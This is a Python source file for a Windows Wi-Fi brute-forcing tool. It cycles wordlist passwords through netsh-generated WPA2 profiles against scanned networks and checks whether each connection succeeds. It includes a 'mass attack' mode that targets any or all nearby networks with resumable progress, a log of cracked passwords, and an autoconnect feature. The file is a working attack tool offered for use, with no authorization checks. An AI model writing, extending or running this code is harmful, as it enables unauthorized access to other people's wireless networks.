#!/usr/bin/env python3
"""
Wi-Fi Brute Forcer – Python Version
- Stylish attack display (mimics original batch logs)
- State parsed from 'netsh wlan show interfaces | findstr /i "State"'
- Mass attack, progress saver, Unicode, connection verification
"""

import os
import sys
import time
import re
import json
import subprocess
from pathlib import Path
from xml.sax.saxutils import escape
from typing import List, Dict, Optional

# ---------- COLOUR SUPPORT ----------
class Colors:
    BLACK   = '\033[30m'
    RED     = '\033[31m'
    GREEN   = '\033[32m'
    YELLOW  = '\033[33m'
    BLUE    = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN    = '\033[36m'
    WHITE   = '\033[37m'
    RESET   = '\033[0m'

    @staticmethod
    def cprint(text, fg='', end='\n'):
        print(f"{fg}{text}{Colors.RESET}", end=end)

# ---------- DATA CLASSES ----------
class Interface:
    def __init__(self):
        self.id = "not_defined"
        self.description = "not_defined"
        self.mac = "not_defined"
        self.state = "not_defined"

class WiFiNetwork:
    def __init__(self, ssid="", signal=""):
        self.ssid = ssid
        self.signal = signal

# ---------- MAIN APP ----------
class WiFiBruteForcer:
    PROGRESS_FILE = "bruteforce_progress.json"

    def __init__(self):
        self.interface = Interface()
        self.wifi_target = "not_defined"
        self.wordlist_file = "not_defined"
        self.attack_counter_option = 0
        self.interfaces: List[Interface] = []
        self.wifi_networks: List[WiFiNetwork] = []
        self.known_passwords: Dict[str, str] = {}
        self.progress = {
            "active": False,
            "targets": [],
            "current_target": "",
            "current_index": 0,
            "wordlist_file": "",
            "interface_id": "",
            "counter_option": 0
        }
        if Path("wordlist.txt").exists():
            self.wordlist_file = "wordlist.txt"
        if Path("importwifi.xml").exists():
            Path("importwifi.xml").unlink()
        self.load_known_passwords()
        self.load_progress()

    # ---------- ENCODING HELPERS ----------
    @staticmethod
    def get_console_code_page():
        try:
            out = subprocess.check_output("chcp", shell=True, text=True, encoding='utf-8', errors='ignore')
            return out.split(":")[-1].strip()
        except:
            return "850"

    def run_netsh(self, command):
        cp = self.get_console_code_page()
        try:
            proc = subprocess.run(command, shell=True, capture_output=True,
                                  text=True, encoding=f"cp{cp}", errors='replace')
            return proc.stdout
        except:
            return ""

    def run_cmd(self, command):
        try:
            proc = subprocess.run(command, shell=True, capture_output=True,
                                  text=True, encoding='utf-8', errors='replace')
            return proc.stdout
        except:
            return ""

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    # ---------- KNOWN PASSWORDS ----------
    def load_known_passwords(self):
        self.known_passwords.clear()
        if not Path("result.txt").exists():
            return
        current_target = None
        try:
            with open("result.txt", "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("Target     : "):
                        current_target = line.split(":", 1)[1].strip()
                    elif line.startswith("Password   : ") and current_target:
                        pwd = line.split(":", 1)[1].strip()
                        if current_target and pwd:
                            self.known_passwords[current_target] = pwd
                            current_target = None
        except:
            pass

    def known_password(self, ssid):
        return self.known_passwords.get(ssid)

    # ---------- INTERFACE DETECTION ----------
    def detect_interfaces(self):
        print()
        Colors.cprint("Detecting interfaces...", Colors.YELLOW)
        out = self.run_netsh("netsh wlan show interfaces")
        self.interfaces.clear()
        lines = out.split('\n')[2:] if out else []
        cur = None; counter = 0; begin = False
        for line in lines:
            line = line.strip()
            if begin and line and ':' in line:
                val = line.split(':', 1)[1].strip()
                if counter == 0:
                    cur = Interface()
                    cur.id = val
                elif counter == 1:
                    cur.description = val
                elif counter == 3:
                    cur.mac = val
                counter += 1
            if counter > 4:
                if cur: self.interfaces.append(cur)
                cur = None; counter = 0; begin = False
            if not line:
                begin = True
        time.sleep(1)
        self.clear()

    def interface_init(self):
        self.clear()
        self.detect_interfaces()
        print()
        Colors.cprint(" Interface Init", Colors.CYAN)
        print()
        if len(self.interfaces) == 1:
            Colors.cprint(" Only '1' Interface Found!", Colors.YELLOW)
            iface = self.interfaces[0]
            Colors.cprint(f" {iface.description}(", Colors.WHITE, end='')
            Colors.cprint(iface.mac, Colors.BLUE, end='')
            Colors.cprint(")", Colors.WHITE)
            print(f"\nMaking {iface.description} default...")
            self.interface = iface
            time.sleep(1)
        elif len(self.interfaces) > 1:
            Colors.cprint(f" Multiple '{len(self.interfaces)}' Interfaces Found!", Colors.YELLOW)
            time.sleep(1)
            self.interface_selection()
        else:
            Colors.cprint("WARNING", Colors.YELLOW)
            print("\nNo interfaces found!\n")
            input("Press Enter...")
            self.clear()

    def interface_selection(self):
        self.clear()
        Colors.cprint("Interface Selection", Colors.CYAN)
        print()
        cancel = len(self.interfaces) + 1
        for i, iface in enumerate(self.interfaces):
            Colors.cprint(f"{i}) ", Colors.MAGENTA, end='')
            Colors.cprint(f" {iface.description}(", Colors.WHITE, end='')
            Colors.cprint(iface.mac, Colors.BLUE, end='')
            Colors.cprint(")", Colors.WHITE)
        Colors.cprint(f"{cancel}) Cancel", Colors.RED)
        ch = self.prompt()
        try:
            idx = int(ch)
            if 0 <= idx < len(self.interfaces):
                self.interface = self.interfaces[idx]
                print(f"\nUsing {self.interface.description}...")
                time.sleep(1)
            elif idx == cancel:
                self.interface = Interface()
            else:
                self.invalid(); self.interface_selection()
        except ValueError:
            if ch == str(cancel):
                self.interface = Interface()
            else:
                self.invalid(); self.interface_selection()

    # ---------- STATE DETECTION (USING FINDSTR /I "State" EQUIVALENT) ----------
    def find_interface_state(self):
        """Extracts the State from netsh wlan show interfaces (like findstr /i "State")."""
        out = self.run_netsh('netsh wlan show interfaces')
        for line in out.split('\n'):
            if 'State' in line and ':' in line:
                state = line.split(':', 1)[1].strip().lower()
                self.interface.state = state
                return
        self.interface.state = "none"

    # ---------- SCANNING ----------
    def scan(self):
        self.clear()
        if self.interface.id == "not_defined":
            Colors.cprint("Select an interface first.", Colors.RED)
            input("Press Enter..."); return False
        self.run_netsh(f'netsh wlan disconnect interface="{self.interface.id}"')
        while True:
            self.find_interface_state()
            if self.interface.state == "disconnected":
                break
        Colors.cprint("Scanning...", Colors.CYAN)
        out = self.run_netsh(f'netsh wlan show networks mode=bssid interface="{self.interface.id}"')
        self.wifi_networks.clear()
        lines = out.split('\n')[3:] if out else []
        cur = None; counter = 0; begin = False
        for line in lines:
            line = line.strip()
            if begin and line and ':' in line:
                val = line.split(':', 1)[1].strip()
                if counter == 0:
                    cur = WiFiNetwork(ssid=val)
                elif counter == 5:
                    cur.signal = val
                counter += 1
            if counter > 5:
                if cur: self.wifi_networks.append(cur)
                cur = None; counter = 0; begin = False
            if not line:
                begin = True
        return True

    def show_scan_results(self):
        cancel = len(self.wifi_networks) + 1
        for i, net in enumerate(self.wifi_networks):
            Colors.cprint(f"{i}) ", Colors.MAGENTA, end='')
            Colors.cprint(f"{net.ssid} ", Colors.WHITE, end='')
            Colors.cprint(net.signal, Colors.BLUE, end='')
            pwd = self.known_password(net.ssid)
            if pwd:
                Colors.cprint("  [known: ", Colors.YELLOW, end='')
                Colors.cprint(pwd, Colors.GREEN, end='')
                Colors.cprint("]", Colors.YELLOW, end='')
            print()
        Colors.cprint(f"{cancel}) Cancel", Colors.RED)

    # ---------- CONNECTED SSID ----------
    def get_connected_ssid(self):
        out = self.run_netsh('netsh wlan show interfaces')
        for line in out.split('\n'):
            if line.strip().lower().startswith("ssid"):
                parts = line.split(":", 1)
                if len(parts) > 1:
                    return parts[1].strip()
        return None

    def verify_connection(self):
        if self.interface.state not in ("connected", "connecting"):
            return False
        return self.get_connected_ssid() == self.wifi_target

    # ---------- XML PROFILE ----------
    def write_xml(self, password):
        xml = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{escape(self.wifi_target)}</name>
    <SSIDConfig>
        <SSID>
            <name>{escape(self.wifi_target)}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{escape(password)}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
    <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
        <enableRandomization>false</enableRandomization>
    </MacRandomization>
</WLANProfile>'''
        with open("importwifi.xml", "w", encoding="utf-8") as f:
            f.write(xml)

    # ---------- STYLISH ATTACK ATTEMPT (BATCH-LIKE) ----------
    def attempt_password(self, password: str, attempt_number: int, total_passwords: int) -> bool:
        """
        Attempt a password with real-time state display.
        Clears once, then prints "Attempts Left (X)" + state every second.
        """
        if Path("importwifi.xml").exists():
            Path("importwifi.xml").unlink()

        self.write_xml(password)
        self.run_netsh(f'netsh wlan add profile filename="importwifi.xml" interface="{self.interface.id}"')
        self.run_netsh(f'netsh wlan connect name="{self.wifi_target}" interface="{self.interface.id}"')

        counter = self.attack_counter_option if self.attack_counter_option else 5
        auth_seen = False

        # Clear and show header once per password
        self.clear()
        print()
        Colors.cprint("Attacking", Colors.CYAN)
        print()
        Colors.cprint("Target Wi-Fi   : ", Colors.MAGENTA, end='')
        Colors.cprint(self.wifi_target, Colors.WHITE)
        Colors.cprint("Password Count : ", Colors.MAGENTA, end='')
        Colors.cprint(f"{attempt_number}/{total_passwords}", Colors.WHITE)
        print()
        Colors.cprint("Trying password -> ", Colors.BLUE, end='')
        Colors.cprint(password, Colors.YELLOW)
        print()
        Colors.cprint("Attempts: ", Colors.CYAN)
        print()

        while counter > 0:
            self.find_interface_state()

            # Print "Attempts Left (X) " without newline
            Colors.cprint("Attempts Left (", Colors.WHITE, end='')
            Colors.cprint(str(counter), Colors.MAGENTA, end='')
            Colors.cprint(") ", Colors.WHITE, end='')

            # Print state with color (mimics batch)
            state = self.interface.state
            if state == "disconnecting":
                Colors.cprint("Disconneting", Colors.RED)        # intentional typo as in batch
            elif state == "disconnected":
                Colors.cprint("Disconnected", Colors.RED)
            elif state == "associating":
                Colors.cprint("Associating", Colors.YELLOW)
            elif state == "authenticating":
                Colors.cprint("Authenticating", Colors.YELLOW)
            elif state == "connecting":
                Colors.cprint("Connecting", Colors.GREEN)
            elif state == "connected":
                Colors.cprint("Connected", Colors.GREEN)
                # Give extra 2 seconds as in batch
                time.sleep(0)
            elif state == "none":
                Colors.cprint("Cannot find interface state!", Colors.RED)
                sys.exit(1)
            else:
                Colors.cprint(state.capitalize(), Colors.WHITE)

            # Handle authentication detection (extend counter once)
            if state == "authenticating" and not auth_seen:
                counter += 5
                auth_seen = True

            # Success check
            if state in ("connecting", "connected"):
                if self.verify_connection():
                    return True
                # False positive – disconnect and keep looping
                self.run_netsh(f'netsh wlan disconnect interface="{self.interface.id}"')
                time.sleep(1)

            time.sleep(1)
            counter -= 1

        return False

    # ---------- SINGLE TARGET ATTACK ----------
    def attack(self):
        self.clear()
        if self.interface.id == "not_defined":
            Colors.cprint("Select an interface first.", Colors.RED); input("Press Enter..."); return
        if self.wifi_target == "not_defined":
            Colors.cprint("Select a target via scan.", Colors.RED); input("Press Enter..."); return
        if not Path(self.wordlist_file).exists():
            Colors.cprint("Wordlist missing.", Colors.RED); input("Press Enter..."); return

        Colors.cprint("WARNING", Colors.YELLOW)
        print(f"\nProfiles for '{self.wifi_target}' will be deleted.\n")
        input("Press Enter to start...")
        self.run_netsh(f'netsh wlan delete profile name="{self.wifi_target}" interface="{self.interface.id}"')

        try:
            with open(self.wordlist_file, "r", encoding="utf-8", errors="replace") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            Colors.cprint("Wordlist not found.", Colors.RED); input("Press Enter..."); return

        total = len(passwords)
        for idx, pwd in enumerate(passwords):
            if self.attempt_password(pwd, idx+1, total):
                self.attack_success(pwd, idx+1)
                return
        self.attack_failure()

    # ---------- MASS ATTACK ----------
    def mass_attack(self):
        self.clear()
        if self.interface.id == "not_defined":
            Colors.cprint("Select an interface first.", Colors.RED); input("Press Enter..."); return
        if not Path(self.wordlist_file).exists():
            Colors.cprint("Provide a valid wordlist first.", Colors.RED); input("Press Enter..."); return

        if not self.scan():
            Colors.cprint("Scan failed.", Colors.RED); input("Press Enter..."); return

        self.clear()
        Colors.cprint("Mass Attack - Select Targets", Colors.CYAN)
        self.show_scan_results()
        print("\nEnter indices separated by commas (e.g., 0,2,4) or 'all':")
        raw = self.prompt()
        if not raw:
            return
        if raw.lower() == 'all':
            indices = list(range(len(self.wifi_networks)))
        else:
            try:
                indices = [int(x.strip()) for x in raw.split(',') if x.strip().isdigit()]
            except:
                self.invalid(); return
        targets = [self.wifi_networks[i].ssid for i in indices if 0 <= i < len(self.wifi_networks)]
        if not targets:
            return

        # Set up progress
        self.progress = {
            "active": True,
            "targets": targets,
            "current_target": targets[0],
            "current_index": 0,
            "wordlist_file": self.wordlist_file,
            "interface_id": self.interface.id,
            "counter_option": self.attack_counter_option
        }
        self.save_progress()

        try:
            with open(self.wordlist_file, "r", encoding="utf-8", errors="replace") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            Colors.cprint("Wordlist disappeared!", Colors.RED)
            self.clear_progress(); return

        total_words = len(passwords)

        while self.progress["targets"]:
            target = self.progress["current_target"]
            start_idx = self.progress["current_index"]
            self.wifi_target = target

            # Clean up previous profile and disconnect
            self.run_netsh(f'netsh wlan delete profile name="{target}" interface="{self.interface.id}"')
            self.run_netsh(f'netsh wlan disconnect interface="{self.interface.id}"')
            time.sleep(1)

            found = False
            for idx in range(start_idx, total_words):
                pwd = passwords[idx]
                if self.attempt_password(pwd, idx+1, total_words):
                    self.attack_success(pwd, idx+1)
                    found = True
                    self.progress["targets"].remove(target)
                    self.progress["current_index"] = 0
                    if self.progress["targets"]:
                        self.progress["current_target"] = self.progress["targets"][0]
                    else:
                        self.progress["active"] = False
                    self.save_progress()
                    break
                # Update progress after every attempt
                self.progress["current_index"] = idx + 1
                self.save_progress()

            if not found:
                Colors.cprint(f"Password not found for {target}", Colors.RED)
                self.progress["targets"].remove(target)
                self.progress["current_index"] = 0
                if self.progress["targets"]:
                    self.progress["current_target"] = self.progress["targets"][0]
                else:
                    self.progress["active"] = False
                self.save_progress()
                time.sleep(2)

        self.clear_progress()
        Colors.cprint("Mass attack finished.", Colors.GREEN)
        input("Press Enter...")

    # ---------- SUCCESS / FAILURE ----------
    def attack_success(self, password, count):
        if Path("importwifi.xml").exists():
            Path("importwifi.xml").unlink()
        self.clear()
        print()
        Colors.cprint("Found the password", Colors.GREEN)
        print()
        Colors.cprint("Target     : ", Colors.MAGENTA, end='')
        Colors.cprint(self.wifi_target, Colors.WHITE)
        Colors.cprint("Password   : ", Colors.MAGENTA, end='')
        Colors.cprint(password, Colors.WHITE)
        Colors.cprint("At attempt : ", Colors.MAGENTA, end='')
        Colors.cprint(str(count), Colors.WHITE)
        print()
        with open("result.txt", "a", encoding="utf-8") as f:
            f.write(f"\nBatch Wi-Fi Brute Forcer Result\n")
            f.write(f"Target     : {self.wifi_target}\n")
            f.write(f"At attempt : {count}\n")
            f.write(f"Password   : {password}\n")
        self.load_known_passwords()
        input("Press Enter...")

    def attack_failure(self):
        if Path("importwifi.xml").exists():
            Path("importwifi.xml").unlink()
        self.clear()
        print()
        Colors.cprint("Could not find the password", Colors.RED)
        self.run_netsh(f'netsh wlan delete profile "{self.wifi_target}" interface="{self.interface.id}"')
        input("Press Enter...")

    # ---------- AUTOCONNECT ----------
    def autoconnect(self):
        self.clear()
        if not self.wifi_networks:
            Colors.cprint("No scan data. Scan first.", Colors.RED); input(); return
        for net in self.wifi_networks:
            pwd = self.known_password(net.ssid)
            if not pwd:
                continue
            self.wifi_target = net.ssid
            self.run_netsh(f'netsh wlan delete profile name="{self.wifi_target}" interface="{self.interface.id}"')
            print(f"Trying known password for {self.wifi_target}...")
            if self.attempt_password(pwd, 1, 1):   # attempt 1/1
                Colors.cprint("Connected!", Colors.GREEN)
            else:
                Colors.cprint("Failed.", Colors.RED)
        input("\nPress Enter...")

    # ---------- MENUS ----------
    def wordlist_menu(self):
        self.clear()
        Colors.cprint("Wordlist", Colors.CYAN)
        path = self.prompt()
        if Path(path).exists():
            self.wordlist_file = path
        else:
            Colors.cprint("File not found.", Colors.RED); time.sleep(1)

    def counter_menu(self):
        self.clear()
        Colors.cprint("Set Attempt Count", Colors.CYAN)
        val = self.prompt()
        if val.isdigit():
            self.attack_counter_option = int(val)
        else:
            Colors.cprint("Invalid number.", Colors.RED); time.sleep(1)

    def help_menu(self):
        self.clear()
        Colors.cprint("Commands", Colors.CYAN)
        print("""
  help        - Show this help
  wordlist    - Set wordlist file
  scan        - Scan Wi‑Fi networks
  interface   - Select network interface
  attack      - Brute‑force selected target
  autoconnect - Try known passwords on all scanned networks
  mass        - Multi‑target sequential brute‑force (with progress save)
  counter     - Set per‑password attempt counter
  exit        - Quit
""")
        input("Press Enter...")

    def banner(self):
        print(r"""
                      ______________
                   ___/              \_
         \_       /       _  __________\       _/
           \     /         \/           \     /
                /     \     \            \
      \_       /  \    \     \______      \       _/
        \      \   \    \     \___//      /      /
                \__/\__/ \___/  __/      /
                 \             /        /
        \_        \                    /        _/
          \        \                  /        /
                    \________________/
        """)

    def prompt(self):
        Colors.cprint(" bruteforcer", Colors.GREEN, end='')
        Colors.cprint("$ ", Colors.WHITE, end='')
        return input().strip()

    def invalid(self):
        Colors.cprint("Invalid input", Colors.RED)
        time.sleep(1)

    # ---------- PROGRESS ----------
    def save_progress(self):
        with open(self.PROGRESS_FILE, "w", encoding="utf-8") as f:
            json.dump(self.progress, f, indent=2)

    def load_progress(self):
        if not Path(self.PROGRESS_FILE).exists():
            return
        try:
            with open(self.PROGRESS_FILE, "r", encoding="utf-8") as f:
                self.progress = json.load(f)
        except:
            self.progress = {"active": False}

    def clear_progress(self):
        self.progress = {"active": False}
        if Path(self.PROGRESS_FILE).exists():
            Path(self.PROGRESS_FILE).unlink()

    def resume_offer(self):
        if not self.progress.get("active"):
            return False
        print()
        Colors.cprint("Saved progress found:", Colors.YELLOW)
        print(f"  Targets left: {self.progress.get('targets', [])}")
        print(f"  Current target: {self.progress.get('current_target', 'none')}")
        print(f"  Wordlist index: {self.progress.get('current_index', 0)}")
        ch = input("Resume? (y/n): ").strip().lower()
        if ch == 'y':
            self.wordlist_file = self.progress.get("wordlist_file", self.wordlist_file)
            self.attack_counter_option = self.progress.get("counter_option", 0)
            return True
        else:
            self.clear_progress()
            return False

    def mainmenu(self):
        while True:
            self.clear()
            self.banner()
            Colors.cprint("Wi-Fi Brute Forcer - DeepSeek", Colors.CYAN)
            print()
            Colors.cprint(f"Interface : {self.interface.description} ({self.interface.mac})", Colors.WHITE)
            Colors.cprint(f"ID        : {self.interface.id}", Colors.WHITE)
            Colors.cprint(f"Target    : {self.wifi_target}", Colors.WHITE)
            Colors.cprint(f"Wordlist  : {self.wordlist_file}", Colors.WHITE)
            print("\nType 'help' for commands\n")
            cmd = self.prompt()
            if cmd == "scan":
                if self.scan():
                    self.clear()
                    self.show_scan_results()
                    print()
                    ch = self.prompt()
                    try:
                        idx = int(ch)
                        cancel = len(self.wifi_networks) + 1
                        if 0 <= idx < len(self.wifi_networks):
                            self.wifi_target = self.wifi_networks[idx].ssid
                        elif idx == cancel:
                            pass
                        else:
                            self.invalid()
                    except ValueError:
                        self.invalid()
            elif cmd == "interface":
                self.interface_init()
            elif cmd == "attack":
                self.attack()
            elif cmd == "mass":
                self.mass_attack()
            elif cmd == "autoconnect":
                self.autoconnect()
            elif cmd == "help":
                self.help_menu()
            elif cmd == "wordlist":
                self.wordlist_menu()
            elif cmd == "counter":
                self.counter_menu()
            elif cmd == "exit":
                sys.exit(0)
            else:
                self.invalid()

    def run(self):
        if os.name == 'nt':
            sys.stdout.reconfigure(encoding='utf-8')
            sys.stderr.reconfigure(encoding='utf-8')
            os.system('chcp 65001 >nul')
        if not "wmic" in self.run_cmd("where wmic").lower():
            Colors.cprint("'wmic' not available. Enable it in Windows Features.", Colors.RED)
            sys.exit(1)
        self.interface_init()
        if self.progress.get("active"):
            if self.resume_offer():
                self.interface.id = self.progress.get("interface_id", self.interface.id)
                self.mass_attack()
        self.mainmenu()

def main():
    app = WiFiBruteForcer()
    app.run()

if __name__ == "__main__":
    main()